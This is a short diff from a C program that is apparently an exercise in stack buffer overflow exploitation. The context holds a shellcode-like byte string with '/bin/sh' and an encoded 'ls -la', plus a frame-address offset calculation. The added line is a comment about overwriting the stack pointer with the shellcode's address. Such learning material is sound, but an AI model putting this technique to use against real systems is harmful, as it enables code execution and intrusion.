@@ -20,6 +20,7 @@ int main(char* argv[], int argc) {
 	"\xff\xff\xff"
 	"/bin/sh"
 	"\x6c\x73\x20\x2d\x6c\x61";
+	//add the address of start of shell code here to overwrite the stack pointer
 
 	 uintptr_t diff = (uintptr_t) __builtin_frame_address(0) - (uintptr_t) rand_str;
 	 printf("%u\n", (int) diff);
